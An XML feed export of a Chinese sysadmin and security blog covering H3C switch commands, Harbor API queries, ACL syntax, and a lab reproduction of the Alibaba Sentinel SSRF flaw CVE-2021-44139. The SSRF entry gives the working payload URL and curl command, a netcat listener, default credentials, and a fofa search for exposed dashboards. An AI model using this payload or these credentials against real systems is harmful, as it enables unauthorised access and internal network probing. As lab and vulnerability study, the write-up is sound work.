href="https://mrwq.github.io/aggregate-paper/butian/Alibaba%20Sentinel%20SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-44139)%E6%B5%85%E6%9E%90/">https://mrwq.github.io/aggregate-paper/butian/Alibaba%20Sentinel%20SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-44139)%E6%B5%85%E6%9E%90/</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
      <category>yunweivulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>yunweivulns</tag>
      
      <tag>weakpassword</tag>
      
      <tag>ftp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>telnet_weak_password</title>
    <link href="/2024/03/04/security/secvulns/telnet/telnet_weak_password/"/>
    <url>/2024/03/04/security/secvulns/telnet/telnet_weak_password/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h3><h4 id="用户视图"><a href="#用户视图" class="headerlink" title="&lt;主机名&gt;  用户视图"></a>&lt;主机名&gt;  用户视图</h4><p>telnet  默认进入的视图，CTRL+Z可以从系统视图切换到用户视图</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown">➜  ~ telnet 10.211.255.51<br>Trying 10.211.255.51...<br>Connected to 10.211.255.51.<br>Escape character is &#x27;^]&#x27;.<br>Login: username<br>Password: <br><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>**<br><span class="hljs-bullet">*</span> Copyright (c) 2004-2019 New H3C Technologies Co., Ltd. All rights reserved.*<br><span class="hljs-bullet">*</span> Without the owner&#x27;s prior written consent,                                 *<br><span class="hljs-bullet">*</span> no decompiling or reverse-engineering shall be allowed.                    *<br><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>**<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">lvs_test</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h4 id="主机名-系统视图"><a href="#主机名-系统视图" class="headerlink" title="[主机名] 系统视图"></a>[主机名] 系统视图</h4><p>用户视图中通过 system-view 命令进入系统视图</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;lvs_test&gt;sys<br>&lt;lvs_test&gt;<span class="hljs-keyword">system</span>-<span class="hljs-keyword">view</span> <br><span class="hljs-keyword">System</span> <span class="hljs-keyword">View</span>: <span class="hljs-keyword">return</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">User</span> <span class="hljs-keyword">View</span> <span class="hljs-keyword">with</span> Ctrl+Z.<br>[lvs_test]<br></code></pre></td></tr></table></figure><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><h4 id="display-clock-查看时间"><a href="#display-clock-查看时间" class="headerlink" title="display clock 查看时间"></a>display clock 查看时间</h4><p>用户和系统模式均可执行</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[lvs_test]</span><span class="hljs-attribute">display</span> clock<br><span class="hljs-number">23</span>:<span class="hljs-number">45</span>:<span class="hljs-number">34.614</span> UTC Tue <span class="hljs-number">01</span>/<span class="hljs-number">02</span>/<span class="hljs-number">2001</span><br></code></pre></td></tr></table></figure><h4 id="display-current-configuration"><a href="#display-current-configuration" class="headerlink" title="display current-configuration"></a>display current-configuration</h4><p>用户和系统模式均可执行</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[lvs_test]display current-configuration<br><span class="hljs-comment">#</span><br> version 7.1.070, Release 6555P01<br><span class="hljs-comment">#</span><br> sysname lvs_test<br><span class="hljs-comment">#</span><br> telnet<span class="hljs-built_in"> server </span><span class="hljs-built_in">enable</span><br><span class="hljs-comment">#</span><br> irf mac-address persistent timer<br> irf auto-update <span class="hljs-built_in">enable</span><br> undo irf link-delay<br> irf member 1 priority 1<br><span class="hljs-comment">#</span><br> parity-<span class="hljs-built_in">error</span> unrecoverable log <span class="hljs-built_in">enable</span><br><span class="hljs-comment">#</span><br> mac-address timer aging 100000<br><span class="hljs-comment">#</span><br> lldp global <span class="hljs-built_in">enable</span><br><span class="hljs-comment">#</span><br> system-working-mode standard<br> password-recovery enable<br></code></pre></td></tr></table></figure><h2 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a>报错信息</h2><h3 id="Unrecognized-command-found-at-position"><a href="#Unrecognized-command-found-at-position" class="headerlink" title="Unrecognized command found at  position"></a>Unrecognized command found at  position</h3><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>视图不对，通过CTRL+Z或者system-view切换视图</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
      <category>yunweivulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>yunweivulns</tag>
      
      <tag>weakpassword</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_tips</title>
    <link href="/2024/02/28/yunwei/applications/docker/docker_tips/"/>
    <url>/2024/02/28/yunwei/applications/docker/docker_tips/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>命令基于 mac Docker Desktop 4.11.1 (84025) </p><h3 id="查询指定镜像仓库镜像列表"><a href="#查询指定镜像仓库镜像列表" class="headerlink" title="查询指定镜像仓库镜像列表"></a>查询指定镜像仓库镜像列表</h3><p><strong>Curl</strong></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">curl -X <span class="hljs-symbol">&#x27;GET</span><span class="hljs-string">&#x27; &#x27;</span>h__ps://demo.goharbor.io/api/v2.<span class="hljs-number">0</span>/projects?page=<span class="hljs-number">1</span>&amp;page_size=<span class="hljs-number">10</span>&amp;with_detail=<span class="hljs-literal">true</span>&#x27;  -H <span class="hljs-symbol">&#x27;accept</span>: application/json&#x27;<br></code></pre></td></tr></table></figure><p><strong>Request URL</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://demo.goharbor.io/api/v2.<span class="hljs-number">0</span>/projects?page=<span class="hljs-number">1</span>&amp;page_size=<span class="hljs-number">10</span>&amp;with_detail=true<br></code></pre></td></tr></table></figure><p>q&#x3D;string   </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">格式<span class="hljs-attribute">q</span>=k=v <br><span class="hljs-attribute">q</span>=name=admin 精确匹配<br><span class="hljs-attribute">q</span>=name=~admin 模糊匹配<br></code></pre></td></tr></table></figure><p>q&#x3D;name&#x3D;admin</p><p>page&#x3D;interger</p><p>page_size&#x3D;interger</p><p>name&#x3D;string 指定项目</p><p>sort&#x3D;string  指定排序字段</p><p>public&#x3D;boolean  指定查询公开项目还是私有项目，默认公开项目</p><p>owner&#x3D;string  指定作者</p><p>with_detail&#x3D;boolean  指定是否需要展示详情</p><h3 id="查询指定镜像仓库指定镜像"><a href="#查询指定镜像仓库指定镜像" class="headerlink" title="查询指定镜像仓库指定镜像"></a>查询指定镜像仓库指定镜像</h3><p><strong>CURL</strong></p><p>curl -X ‘GET’ ‘h__ps:&#x2F;&#x2F;demo.goharbor.io&#x2F;api&#x2F;v2.0&#x2F;search?q&#x3D;1’ -H ‘accept: application&#x2F;json’</p><p><strong>Request URL</strong></p><p>h__ps:&#x2F;&#x2F;demo.goharbor.io&#x2F;api&#x2F;v2.0&#x2F;search?q&#x3D;1</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>docker</tag>
      
      <tag>tips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>switch_rules</title>
    <link href="/2024/02/26/yunwei/switch/switch_rules/"/>
    <url>/2024/02/26/yunwei/switch/switch_rules/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>基本ACL支持根据源IP地址过滤报文，高级ACL不仅支持源IP地址，还支持根据目的IP地址过滤报文</p><p>策略执行顺序</p><p>从上往下</p><p>首次匹配</p><p>一旦有规则匹配到了数据包，交换机就会执行该规则指定的操作，并停止继续检查其他规则。这意味着如果ACL中的某个规则匹配了数据包，后面的规则就不会再被考虑。</p><p>默认策略</p><p>如果数据包没有匹配到任何ACL策略，交换机会按照默认策略处理，也就是需要在策略最后添加默认允许或默认拒绝</p><p>格式</p><p>access-list &lt;编号&gt; &lt;策略&gt; &lt;协议&gt; &lt;源地址&gt; &lt;源地址掩码&gt; &lt;目标地址&gt; &lt;目标地址掩码&gt; [&lt;源端口&gt; &lt;目标端口&gt; ]</p><p>语法</p><p>必须</p><p>access-list: 表示创建或编辑ACL规则</p><p>编号：ACL编号，用于区分不同的ACL规则，（范围通常为100-199（扩展ACL）或2000-2699（基于时间的ACL））需要确认的点</p><p>策略：指定访问控制的行为，包含permit（允许）和 deny （拒绝）两种策略</p><p>协议：指定需要匹配的协议类型，例如TCP、UDP、ICMP、IP（表示任何IP层协议，协议号的取值可以是1~255）等</p><p>源地址：指定访问控制来源IP地址</p><p>源地址掩码：指定访问控制来源IP地址的子网范围</p><p>目标地址：指定访问控制目的IP地址</p><p>目标地址掩码：指定访问控制目的IP地址的子网范围</p><p>可选</p><p>源端口  目标端口 ：TCP和UDP协议支持指定端口，比较符 eq port 等于，gt port 大于，lt port 小于，range startport endport 端口范围</p><p>可以写具体端口，也可以写常用服务（www）</p><p>常见TCP端口对应字符串</p><table><thead><tr><th><strong>端口号</strong></th><th><strong>字符串</strong></th><th><strong>协议</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>7</td><td>echo</td><td>Echo</td><td>计算机命令</td></tr><tr><td>9</td><td>discard</td><td>Discard</td><td>用于连接测试的空服务</td></tr><tr><td>13</td><td>daytime</td><td>Daytime</td><td>给请求主机发送日期和时间</td></tr><tr><td>19</td><td>CHARgen</td><td>Character generator</td><td>字符生成服务；发送无止境的字符流</td></tr><tr><td>20</td><td>ftp-data</td><td>FTP data connections</td><td>FTP数据端口</td></tr><tr><td>21</td><td>ftp</td><td>File Transfer Protocol(FTP)</td><td>文件传输协议（FTP）端口</td></tr><tr><td>23</td><td>telnet</td><td>Telnet</td><td>Telnet服务</td></tr><tr><td>25</td><td>smtp</td><td>Simple Mail Transport Protocol(SMTP)</td><td>简单邮件传输协议</td></tr><tr><td>37</td><td>time</td><td>Time</td><td>时间协议</td></tr><tr><td>43</td><td>whois</td><td>Nickname（WHOIS）</td><td>目录服务</td></tr><tr><td>49</td><td>tacacs</td><td>TAC Access Control System (TACACS)</td><td>用于基于TCP&#x2F;IP验证和访问的访问控制系统（TACACS登录主机协议）</td></tr><tr><td>53</td><td>domain</td><td>Domain Name Service(DNS)</td><td>域名服务</td></tr><tr><td>70</td><td>gopher</td><td>Gopher</td><td>信息检索协议（互联网文档搜寻和检索）</td></tr><tr><td>79</td><td>finger</td><td>Finger</td><td>用于用户联系信息的Finger服务，查询远程主机在线用户等信息</td></tr><tr><td>80</td><td>www</td><td>World Wide Web(HTTP)</td><td>用于万维网（WWW）服务的超文本传输协议（HTTP），用于网页浏览</td></tr><tr><td>101</td><td>hostname</td><td>NIC hostname server</td><td>NIC机器上的主机名服务</td></tr><tr><td>109</td><td>pop2</td><td>Post Office Protocol v2</td><td>邮件协议-版本2</td></tr><tr><td>110</td><td>pop3</td><td>Post Office Protocol v3</td><td>邮件协议-版本3</td></tr><tr><td>111</td><td>sunrpc</td><td>Sun Remote Procedure Call (RPC)</td><td>SUN公司的远程过程调用（RPC）协议，用于远程命令执行，被网络文件系统（NFS）使用</td></tr><tr><td>119</td><td>nntp</td><td>Network News Transport Protocol(NNTP)</td><td>网络新闻传输协议，承载USENET通信</td></tr><tr><td>179</td><td>bgp</td><td>Border Gateway Protocol (BGP)</td><td>边界网关协议</td></tr><tr><td>194</td><td>irc</td><td>Internet Relay Chat(IRC)</td><td>互联网中继聊天（多线交谈协议）</td></tr><tr><td>512</td><td>exec</td><td>Exec (rsh)</td><td>用于对远程执行的进程进行验证</td></tr><tr><td>513</td><td>login</td><td>Login (rlogin)</td><td>远程登录</td></tr><tr><td>514</td><td>cmd</td><td>Remote commands</td><td>远程命令，不必登录的远程shell（rshell）和远程复制（rcp）</td></tr><tr><td>515</td><td>lpd</td><td>Printer service</td><td>打印机（lpr）假脱机</td></tr><tr><td>517</td><td>talk</td><td>Talk</td><td>远程对话服务和客户</td></tr><tr><td>540</td><td>uucp</td><td>Unix-to-Unix Copy Program</td><td>Unix到Unix复制服务</td></tr><tr><td>543</td><td>klogin</td><td>Kerberos login</td><td>Kerberos版本5 （v5）远程登录</td></tr><tr><td>544</td><td>kshell</td><td>Kerberos shell</td><td>Kerberos版本5 （v5）远程shell</td></tr></tbody></table><p>常见UDP端口对应字符串</p><table><thead><tr><th>端口号</th><th>字符串</th><th>协议</th><th>说明</th></tr></thead><tbody><tr><td>7</td><td>echo</td><td>Echo</td><td>计算机命令</td></tr><tr><td>9</td><td>discard</td><td>Discard</td><td>用于连接测试的空服务</td></tr><tr><td>37</td><td>time</td><td>Time</td><td>时间协议</td></tr><tr><td>42</td><td>nameserver</td><td>Host Name Server</td><td>主机名服务</td></tr><tr><td>53</td><td>dns</td><td>Domain Name Service (DNS)</td><td>域名服务</td></tr><tr><td>65</td><td>tacacs-ds</td><td>TACACS-Database Service</td><td>TACACS数据库服务</td></tr><tr><td>67</td><td>bootps</td><td>Bootstrap Protocol Server</td><td>引导程序协议 （BOOTP）服务端， DHCP服务使用</td></tr><tr><td>68</td><td>bootpc</td><td>Bootstrap Protocol Client</td><td>引导程序协议 （BOOTP）客户端， DHCP客户使用</td></tr><tr><td>69</td><td>tftp</td><td>Trivial File Transfer Protocol (TFTP)</td><td>小文件传输协议</td></tr><tr><td>90</td><td>dnsix</td><td>DNSIX Security Attribute Token Map</td><td>DNSIX安全属性标记图</td></tr><tr><td>111</td><td>sunrpc</td><td>SUN Remote Procedure Call (SUN RPC)</td><td>SUN公司的远程过程调用（RPC）协议， 用于远程命令执行， 被网络文件系统（NFS）使用</td></tr><tr><td>123</td><td>ntp</td><td>Network Time Protocol (NTP)</td><td>网络时间协议，蠕虫病毒会利用</td></tr><tr><td>137</td><td>netbios-ns</td><td>NETBIOS Name Service</td><td>NETBIOS名称服务</td></tr><tr><td>138</td><td>netbios-dgm</td><td>NETBIOS Datagram Service</td><td>NETBIOS数据报服务</td></tr><tr><td>139</td><td>netbios-ssn</td><td>NETBIOS Session Service</td><td>NETBIOS会话服务</td></tr><tr><td>161</td><td>snmp</td><td>SNMP</td><td>简单网络管理协议</td></tr><tr><td>162</td><td>snmptrap</td><td>SNMPTRAP</td><td>SNMP陷阱</td></tr><tr><td>177</td><td>xdmcp</td><td>X Display Manager Control Protocol (XDMCP)</td><td>X显示管理器控制协议</td></tr><tr><td>434</td><td>mobilip-ag</td><td>MobileIP-Agent</td><td>移动IP代理</td></tr><tr><td>435</td><td>mobilip-mn</td><td>MobileIP-MN</td><td>移动IP管理</td></tr><tr><td>512</td><td>biff</td><td>Mail notify</td><td>异步邮件，可用来通知用户有邮件到达</td></tr><tr><td>513</td><td>who</td><td>Who</td><td>登录的用户列表</td></tr><tr><td>514</td><td>syslog</td><td>Syslog</td><td>UNIX系统日志服务</td></tr><tr><td>517</td><td>talk</td><td>Talk</td><td>远程对话服务器和客户端</td></tr><tr><td>520</td><td>rip</td><td>Routing Information Protocol</td><td>RIP路由协议</td></tr></tbody></table><p>掩码说明</p><p>IP地址通配符掩码与IP地址的反向子网掩码类似，也是一个32比特位的数字字符串，用于指示IP地址中的哪些位将被检查。各比特位中，“0”表示“检查相应的位”，“1”表示“不检查相应的位”，概括为一句话就是“检查0，忽略1”。但与IP地址子网掩码不同的是，子网掩码中的“0”和“1”要求必须连续，而通配符掩码中的“0”和“1”可以不连续。</p><p>通配符掩码可以为0，相当于0.0.0.0，表示源&#x2F;目的地址为主机地址；也可以为255.255.255.255，表示任意IP地址，相当于指定<strong>any</strong>参数</p><p>例如：</p><p>匹配 192.168.1.0&#x2F;24 ，可以写为 192.168.1.0 0.0.0.255，也就是只检查前24个比特位</p><p>实例：</p><p>允许特定源、目的IP之间 3306 端口的TCP流量</p><p>rule 5 permit tcp source 10.122.1.1 0 destination 172.16.1.1 0 destination-port eq 3306</p><p>规则编号：rule 5</p><p>策略：permit（允许）</p><p>协议：TCP</p><p>源地址：10.122.1.1</p><p>源地址掩码：0  通配符掩码，0表示必须精确匹配源地址</p><p>目标地址：172.16.1.1 </p><p>目的地址掩码：0  通配符掩码，0表示必须精确匹配目标地址</p><p>目标端口：eq（等于） 3306</p><p>允许ICMP协议数据包通过</p><p>rule 500 permit icmp</p><p>允许ICMP Echo请求数据包通过</p><p>rule 501 permit icmp icmp-type echo</p><p>允许ICMP Echo Reply 响应数据包通过，ICMP Echo Reply 是对 ICMP Echo 请求的响应，用于确认网络连接和诊断网络延迟</p><p>rule 502 permit icmp icmp-type echo-reply </p><p>允许ICMP port-unreachable 数据包通过，即目标端口不可达时，主机会发送 ICMP port-unreachable 消息作为响应</p><p>rule 503 permit icmp icmp-type port-unreachable </p><p>允许ICMP ttl-exceeded 数据包通过，即数据包TTL（Time to Live）字段减到0时，路由器会丢弃该数据包，并向源主机发送ICMP ttl-exceeded数据包</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>switch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>switch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>alibaba_Sentinel_base</title>
    <link href="/2024/02/21/security/secvulns/alibaba%20Sentinel/alibaba_Sentinel_base/"/>
    <url>/2024/02/21/security/secvulns/alibaba%20Sentinel/alibaba_Sentinel_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>默认端口：8080</p><p>默认密码 sentinel&#x2F;sentinel</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
      <category>yunweivulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>yunweivulns</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Alibaba_Sentinel_SSRF_CVE-2021-44139</title>
    <link href="/2024/02/21/security/secvulns/alibaba%20Sentinel/Alibaba_Sentinel_SSRF_CVE-2021-44139/"/>
    <url>/2024/02/21/security/secvulns/alibaba%20Sentinel/Alibaba_Sentinel_SSRF_CVE-2021-44139/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="漏洞名称"><a href="#漏洞名称" class="headerlink" title="漏洞名称"></a>漏洞名称</h2><p>alibaba hashicorp sentinel 服务端请求伪造（ssrf）</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Alibaba开源限流熔断组件Sentinel中的管控平台sentinel-dashboard存在认证前SSRF漏洞，恶意用户无需认证即可通过该接口进行SSRF攻击。</p><h2 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h2><p>CVE-2021-44139</p><h2 id="漏洞级别"><a href="#漏洞级别" class="headerlink" title="漏洞级别"></a>漏洞级别</h2><p>高危</p><h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><p>1.8.2版本</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>升级到最新版本</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><p>1、下载 1.8.2 版本jar包</p><p>首页-&gt;Tags-&gt;1.8.2</p><p>h__ps:&#x2F;&#x2F;github.com&#x2F;alibaba&#x2F;Sentinel&#x2F;releases&#x2F;tag&#x2F;1.8.2</p><p>2、启动服务</p><p>java -jar sentinel-dashboard-1.8.2.jar</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">➜  Alibaba_Sentinel_SSRF_CVE-2021-44139 java -jar sentinel-dashboard-1.8.2.jar<br>INFO: Sentinel log output type is: file<br>INFO: Sentinel log charset is: utf-8<br>INFO: Sentinel log base directory is: /Users/admin/logs/csp/<br>INFO: Sentinel log name use pid is: false<br><br>  .   ____          _            __ _ _<br> /\\ / ___&#x27;_ __ _ _(_)_ __  __ _ \ \ \ \<br>( ( )\___ |<span class="hljs-string"> &#x27;_ </span>|<span class="hljs-string"> &#x27;_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> &#x27;_ \/ _` </span>|<span class="hljs-string"> \ \ \ \</span><br><span class="hljs-string"> \\/  ___)</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_)</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>||<span class="hljs-string"> (_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">  ) ) ) )</span><br><span class="hljs-string">  &#x27;  </span>|<span class="hljs-string">____</span>|<span class="hljs-string"> .__</span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_\__, </span>|<span class="hljs-string"> / / / /</span><br><span class="hljs-string"> =========</span>|<span class="hljs-string">_</span>|<span class="hljs-string">==============</span>|<span class="hljs-string">___/=/_/_/_/</span><br><span class="hljs-string"> :: Spring Boot ::        (v2.0.5.RELEASE)</span><br><span class="hljs-string"></span><br><span class="hljs-string">2024-02-22 19:48:59.528  INFO 6822 --- [           main] c.a.c.s.dashboard.DashboardApplication   : Starting DashboardApplication on 110.local with PID 6822 (/Users/admin/codes/vulncodes/Alibaba_Sentinel_SSRF_CVE-2021-44139/sentinel-dashboard-1.8.2.jar started by admin in /Users/admin/codes/vulncodes/Alibaba_Sentinel_SSRF_CVE-2021-44139)</span><br></code></pre></td></tr></table></figure><p>3、访问服务</p><p>默认端口 8080</p><p>h__p:&#x2F;&#x2F;10.222.28.10:8080&#x2F;#&#x2F;login</p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>1、攻击主机 10.235.151.11（Windows） 监听 80 端口</p><p>nc64.exe -lp 80</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">D</span>:\nc\netcat-win32-<span class="hljs-number">1</span>.<span class="hljs-number">12</span>&gt;nc64.exe -lp <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>2、构造Payload</p><p>h__p:&#x2F;&#x2F;ip&#x2F;registry&#x2F;machine?app&#x3D;40bdb&amp;appType&#x3D;0&amp;version&#x3D;0&amp;hostname&#x3D;VbxGe&amp;ip&#x3D;attackip&amp;port&#x3D;0</p><p>ip 替换为被攻击主机，部署服务的主机 10.222.28.10</p><p>attackip 替换为攻击主机 10.235.151.11</p><p>h__p:&#x2F;&#x2F;10.222.28.10:8080&#x2F;registry&#x2F;machine?app&#x3D;40bdb&amp;appType&#x3D;0&amp;version&#x3D;0&amp;hostname&#x3D;VbxGe&amp;ip&#x3D;10.235.151.11&amp;port&#x3D;0</p><p>3、执行payload</p><p>10.222.28.10:8080&#x2F;registry&#x2F;machine?app&#x3D;40bdb&amp;appType&#x3D;0&amp;version&#x3D;0&amp;hostname&#x3D;VbxGe&amp;ip&#x3D;10.235.151.11&amp;port&#x3D;0</p><p>curl “<a href="http://10.222.28.10:8080/registry/machine?app=40bdb&appType=0&version=0&hostname=VbxGe&ip=10.235.151.11&port=0">http://10.222.28.10:8080/registry/machine?app=40bdb&amp;appType=0&amp;version=0&amp;hostname=VbxGe&amp;ip=10.235.151.11&amp;port=0</a>“</p><p>4、攻击结果</p><p>攻击主机监听的 80 会收到来自被攻击主机的请求</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">D</span>:\nc\netcat-win32-<span class="hljs-number">1</span>.<span class="hljs-number">12</span>&gt;nc64.exe -lp <span class="hljs-number">80</span><br><span class="hljs-attribute">GET</span> /metric?startTime=<span class="hljs-number">1708654313000</span>&amp;endTime=<span class="hljs-number">1708654319000</span>&amp;refetch=false HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Connection</span>: Close<br><span class="hljs-attribute">Host</span>: <span class="hljs-number">10.235.151.11:0</span><br><span class="hljs-attribute">User</span>-Agent: Apache-HttpAsyncClient/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">3</span> (Java/<span class="hljs-number">11.0.15.1</span>)<br></code></pre></td></tr></table></figure><p>payload 访问结果</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;success&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;code&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;msg&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;success&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="默认信息"><a href="#默认信息" class="headerlink" title="默认信息"></a>默认信息</h3><p>默认端口 8080</p><p>默认密码 sentinel&#x2F;sentinel</p><h3 id="服务指纹"><a href="#服务指纹" class="headerlink" title="服务指纹"></a>服务指纹</h3><p>title：Sentinel Dashboard</p><h3 id="服务查询"><a href="#服务查询" class="headerlink" title="服务查询"></a>服务查询</h3><h4 id="fofa-info"><a href="#fofa-info" class="headerlink" title="fofa.info"></a>fofa.info</h4><p>“title: Sentinel Dashboard”</p><h4 id="nmap检测"><a href="#nmap检测" class="headerlink" title="nmap检测"></a>nmap检测</h4><p>nmap -A 进行探测 ，SERVER 为 http-proxy ，页面中包含 “Sentinel Dashboard”</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 